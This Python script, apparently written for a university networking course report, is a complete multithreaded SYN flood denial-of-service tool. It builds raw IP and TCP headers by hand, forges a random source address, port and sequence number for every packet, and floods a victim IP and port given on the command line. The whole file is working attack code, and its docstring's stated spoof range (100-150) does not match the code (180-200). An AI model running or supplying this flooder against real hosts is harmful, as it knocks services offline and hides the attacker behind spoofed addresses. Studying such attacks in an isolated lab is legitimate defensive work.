#!/usr/bin/env python3
"""
Custom raw-socket SYN flood sender for the CSE406 design report.
Builds every IP/TCP header field ourselves with struct -- no
hping3 / Scapy / other pre-built attack tool is used.

This version adds:
  * an optional NUMBER-OF-THREADS argument to raise the send rate
    (each thread still crafts a fresh spoofed IP/port/seq per packet,
     so the "different source every packet" design is unchanged)
  * spoof range kept at 100-150 (edit LO/HI below if needed)

Usage (must be run as root, e.g. inside a Mininet host or with sudo):
    python3 attacker.py <victim_ip> [victim_port] [spoof_prefix] [threads]

Example:
    sudo python3 attacker.py 172.24.0.79 80 172.24.0 8
"""
import socket
import struct
import random
import sys
import time
import threading

# spoofed last-octet range (keep OUTSIDE the real victim/attacker IPs)
LO, HI = 180, 200


def checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\0"
    total = 0
    for i in range(0, len(data), 2):
        word = (data[i] << 8) + data[i + 1]
        total += word
    total = (total >> 16) + (total & 0xFFFF)
    total += total >> 16
    return ~total & 0xFFFF


def build_ip_header(src_ip: str, dst_ip: str, payload_len: int) -> bytes:
    version_ihl = (4 << 4) + 5
    tos = 0
    total_len = 20 + payload_len
    ident = random.randint(0, 65535)
    flags_frag = 0
    ttl = 64
    proto = socket.IPPROTO_TCP
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)

    header = struct.pack("!BBHHHBBH4s4s",
        version_ihl, tos, total_len, ident, flags_frag, ttl, proto, 0, src, dst)
    ip_checksum = checksum(header)
    header = struct.pack("!BBHHHBBH4s4s",
        version_ihl, tos, total_len, ident, flags_frag, ttl, proto, ip_checksum, src, dst)
    return header


def build_tcp_syn_header(src_ip, dst_ip, src_port, dst_port, seq) -> bytes:
    ack_seq = 0
    data_offset = (5 << 4)
    flags = 0x02          # SYN only
    window = 8192
    urg_ptr = 0

    tcp_header = struct.pack("!HHLLBBHHH",
        src_port, dst_port, seq, ack_seq, data_offset, flags, window, 0, urg_ptr)
    pseudo_header = struct.pack("!4s4sBBH",
        socket.inet_aton(src_ip), socket.inet_aton(dst_ip), 0, socket.IPPROTO_TCP, len(tcp_header))
    tcp_checksum = checksum(pseudo_header + tcp_header)
    tcp_header = struct.pack("!HHLLBBHHH",
        src_port, dst_port, seq, ack_seq, data_offset, flags, window, tcp_checksum, urg_ptr)
    return tcp_header


def random_spoofed_ip(spoof_prefix: str) -> str:
    return f"{spoof_prefix}.{random.randint(LO, HI)}"


# shared counter across threads
counter_lock = threading.Lock()
count = 0
stop = False


def worker(victim_ip, victim_port, spoof_prefix):
    global count
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    while not stop:
        src_ip = random_spoofed_ip(spoof_prefix)
        src_port = random.randint(1024, 65535)
        seq = random.randint(0, 2**32 - 1)
        tcp_hdr = build_tcp_syn_header(src_ip, victim_ip, src_port, victim_port, seq)
        ip_hdr = build_ip_header(src_ip, victim_ip, len(tcp_hdr))
        packet = ip_hdr + tcp_hdr
        try:
            s.sendto(packet, (victim_ip, 0))
        except Exception:
            continue
        with counter_lock:
            count += 1


def main():
    global stop
    if len(sys.argv) < 2:
        print("Usage: python3 attacker.py <victim_ip> [victim_port] [spoof_prefix] [threads]")
        sys.exit(1)

    victim_ip = sys.argv[1]
    victim_port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    spoof_prefix = sys.argv[3] if len(sys.argv) > 3 else "10.0.0"
    n_threads = int(sys.argv[4]) if len(sys.argv) > 4 else 4

    print(f"[attacker] flooding {victim_ip}:{victim_port} with {n_threads} threads "
          f"(spoof {spoof_prefix}.{LO}-{HI}) ... (Ctrl+C to stop)")

    threads = []
    for _ in range(n_threads):
        t = threading.Thread(target=worker, args=(victim_ip, victim_port, spoof_prefix), daemon=True)
        t.start()
        threads.append(t)

    start = time.time()
    try:
        while True:
            time.sleep(1)
            with counter_lock:
                c = count
            elapsed = time.time() - start
            rate = c / elapsed if elapsed > 0 else 0
            print(f"[attacker] sent {c} packets  ({rate:.0f} pkt/s)")
    except KeyboardInterrupt:
        stop = True
        elapsed = time.time() - start
        with counter_lock:
            c = count
        rate = c / elapsed if elapsed > 0 else 0
        print(f"\n[attacker] stopped. Sent {c} packets in {elapsed:.1f}s ({rate:.0f} pkt/s avg).")


if __name__ == "__main__":
    main()